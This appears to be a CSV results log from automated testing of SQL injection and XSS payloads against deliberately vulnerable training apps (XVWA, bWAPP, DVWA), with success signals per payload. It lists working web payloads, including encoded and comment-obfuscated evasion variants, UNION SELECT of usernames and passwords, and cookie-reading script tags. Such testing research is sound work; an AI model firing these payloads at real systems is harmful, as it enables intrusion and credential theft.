+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,7,%2527%2520OR%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.216334+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,8,%27%20OR%201=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,47,,2026-10-19T02:48:57.231150+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,9,%27%20UNION%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,47,,2026-10-19T02:48:57.235356+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,10,%2527/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.258821+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,11,"%27%20union%20SELECT%20username,password%20FROM%20users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:57.262729+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,12,%2527%2520or%25201=1#,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.268012+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,13,%27%20OR%20%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:57.272672+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,14,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:57.284720+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,15,%27%20OR%20%27%27=%27,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,94,,2026-10-19T02:48:57.303458+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,16,%2527%2520UNION%2520SELECT%2520NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.306575+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,17,%27/**/OR/**/%27x%27=%27x%27--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:57.316912+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,18,%27/**/or/**/1=1#,200,SQL_RESULT_DIFFERENTIAL,true,result_rows:10;baseline:0,,63,,2026-10-19T02:48:57.322762+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,19,%252527/**/OR/**/%252527x%252527=%252527x%252527--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.330957+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,20,%2527/**/OR/**/%2527a%2527=%2527a,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.335109+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,21,%27/**/AND/**/1=1--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,62,,2026-10-19T02:48:57.344354+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,22,%27%20OR%20EXISTS(SELECT%201)--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,78,,2026-10-19T02:48:57.357850+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,23,%27%20union%20SELECT%20NULL--,200,SQL_ERROR_SIGNAL_UNCONFIRMED,false,sql_error_text,,63,,2026-10-19T02:48:57.368902+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,XVWA,SQL Injection,Evasion,24,%2527%2520or%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.376687+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,1,%27%20OR%20%27a%27=%27a,200,NO_CONFIRMATION_SIGNAL,false,,,203,,2026-10-19T02:48:57.523185+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,2,' AND 1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.384751+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,3,%27%20or%20%271%27=%271,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.389384+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,4,'/**/UNION/**/SELECT/**/NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.398515+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,5,%2527%2520AND%25201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.402732+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,6,' OR '1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.423573+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,7,'/**/OR/**/EXISTS(SELECT/**/1)--,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.444620+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,8,'/**/OR/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.445279+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,9,%27%20UNION%20SELECT%20NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.453956+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,10,' OR EXISTS(SELECT 1)--,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.463660+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,11,' OR 1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.471738+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,12,'/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.476606+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,13,' OR ''=',200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:57.490448+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,14,'/**/or/**/''=',200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.509427+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,15,'/**/OR/**/'x'='x'--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.513411+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,16,' or '1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:57.516409+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,17,' OR 1=1#,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.520580+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,18,"' UNION SELECT username,password FROM users--",200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:57.521161+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,19,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:57.521161+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,20,"' union SELECT username,password FROM users--",200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.521670+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,21,' OR 'x'='x'--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:57.527806+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,22,%27/**/OR/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,328,,2026-10-19T02:48:57.835517+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,23,' UNION SELECT NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:57.871963+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,24,' OR 'a'='a,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:57.892382+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,25,%27%20OR%20%271%27=%271,200,NO_CONFIRMATION_SIGNAL,false,,,47,,2026-10-19T02:48:57.882835+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,26,%27%20OR%20%27%27=%27,200,NO_CONFIRMATION_SIGNAL,false,,,360,,2026-10-19T02:48:58.195378+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Basic,27,%27%20AND%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:58.195378+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,1,'/**/OR/**/''=',200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:58.195378+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,2,'/**/or/**/EXISTS(SELECT/**/1)--,200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:58.195378+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,3,%27%20OR%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,344,,2026-10-19T02:48:58.195378+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,4,'/**/OR/**/'a'='a,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.897034+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,5,'/**/OR/**/1=1#,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:57.912690+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,6,'/**/OR/**/'1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:57.916691+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,7,%27/**/or/**/%27x%27=%27x%27--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:57.922155+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,8,"'/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:57.935773+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,9,'/**/OR/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:57.940001+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,10,'/**/OR/**/EXISTS(SELECT/**/1)--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.944234+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,11,'/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.958535+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,12,'/**/or/**/'1'='1,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:57.962073+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,13,'/**/or/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:57.965591+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,14,'/**/union/**/SELECT/**/NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:57.981383+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,15,%27%20OR%20EXISTS(SELECT%201)--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:57.985331+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,16,'/**/OR/**/'x'='x'--,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:57.989151+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,17,'/**/UNION/**/SELECT/**/NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.002702+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Advanced,18,%27%20UNION%20SELECT%20NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.006332+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,1,%27%20OR%20%27a%27=%27a,200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:58.010185+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,2,%27%20AND%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.023612+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,3,%27%20or%20EXISTS(SELECT%201)--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.026623+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,4,%27%20OR%201=1--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.031547+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,5,%27%20OR%20%271%27=%271,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.045054+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,6,"%27%20UNION%20SELECT%20username,password%20FROM%20users--",200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.049096+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,7,%2527%2520OR%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.052965+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,8,%27%20OR%201=1#,200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:58.063679+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,9,%27%20UNION%20SELECT%20NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.073969+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,10,%2527/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.079505+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,11,"%27%20union%20SELECT%20username,password%20FROM%20users--",200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.091248+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,12,%2527%2520or%25201=1#,200,NO_CONFIRMATION_SIGNAL,false,,,15,,2026-10-19T02:48:58.097645+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,13,%27%20OR%20%27x%27=%27x%27--,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.098795+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,14,"%27/**/UNION/**/SELECT/**/username,password/**/FROM/**/users--",200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:58.115444+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,15,%27%20OR%20%27%27=%27,200,NO_CONFIRMATION_SIGNAL,false,,,32,,2026-10-19T02:48:58.118956+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,16,%2527%2520UNION%2520SELECT%2520NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,16,,2026-10-19T02:48:58.118956+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,17,%27/**/OR/**/%27x%27=%27x%27--,200,NO_CONFIRMATION_SIGNAL,false,,,0,,2026-10-19T02:48:58.125039+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,18,%27/**/or/**/1=1#,200,NO_CONFIRMATION_SIGNAL,false,,,31,,2026-10-19T02:48:58.233142+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,19,%252527/**/OR/**/%252527x%252527=%252527x%252527--,200,NO_CONFIRMATION_SIGNAL,false,,,62,,2026-10-19T02:48:58.262397+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,20,%2527/**/OR/**/%2527a%2527=%2527a,200,NO_CONFIRMATION_SIGNAL,false,,,78,,2026-10-19T02:48:58.270333+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,21,%27/**/AND/**/1=1--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:58.277220+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,22,%27%20OR%20EXISTS(SELECT%201)--,200,NO_CONFIRMATION_SIGNAL,false,,,63,,2026-10-19T02:48:58.281970+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,23,%27%20union%20SELECT%20NULL--,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:48:58.286208+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,bWAPP,SQL Injection,Evasion,24,%2527%2520or%2520%2527x%2527=%2527x%2527--,200,NO_CONFIRMATION_SIGNAL,false,,,79,,2026-10-19T02:48:58.290481+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,1,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,250,,2026-10-19T02:48:20.602864+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,2,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:20.759945+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,3,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:20.943248+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,4,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:21.119490+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,5,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,187,,2026-10-19T02:48:21.307592+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,6,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:21.490455+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,7,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:21.650257+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,8,%3CScRiPt%3Eprompt(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:21.816527+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,9,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:21.991561+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,10,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:22.157355+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,11,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:22.316216+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,12,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:22.483421+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,13,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:22.646880+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,14,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:22.813916+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Basic,15,%3Csvg%20onload=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:22.981424+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,1,<img src=x onerror=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:23.155969+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,2,<script>alert(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:23.329831+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,3,<script>alert(document.cookie)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:23.497329+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,4,<svg onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:23.674935+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,5,<img src=x onerror=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,171,,2026-10-19T02:48:23.846277+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,6,%3Cimg%20src=x%20onerror=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:24.021155+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,7,<body onload=alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:24.190586+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,8,<ScRiPt>prompt(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,438,,2026-10-19T02:48:24.623389+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,9,<ScRiPt>alert(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:24.778641+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,10,<script>confirm(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:24.952360+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,11,<svg onload=confirm(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:25.117417+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,12,%3Ciframe%20src=javascript:alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,140,,2026-10-19T02:48:25.268383+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,13,%3CScRiPt%3Econfirm(1)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:25.437135+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,14,%3Csvg%20onload=confirm(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:25.610091+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,15,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:25.768248+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,16,%3CScRiPt%3Ealert(document.cookie)%3C/ScRiPt%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:25.935075+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,17,<iframe src=javascript:alert(1)>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:26.108951+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,18,<ScRiPt>confirm(1)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:26.275133+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,19,<script>prompt(1)</script>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:26.434074+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,20,<ScRiPt>alert(document.cookie)</ScRiPt>,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,188,,2026-10-19T02:48:26.616407+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,21,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:26.774929+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Advanced,22,%3Cscript%3Eprompt(1)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,156,,2026-10-19T02:48:26.932301+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,1,%3Cimg%20src=x%20onerror=alert(1)%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:27.108016+00:00
+table14_shared_rng_full_hybrid_density_20261019T024747Z,DVWA,XSS,Evasion,2,%3Cscript%3Ealert(document.cookie)%3C/script%3E,200,JAVASCRIPT_DIALOG_CONFIRMED,true,browser_dialog_event,,172,,2026-10-19T02:48:27.280669+00:00
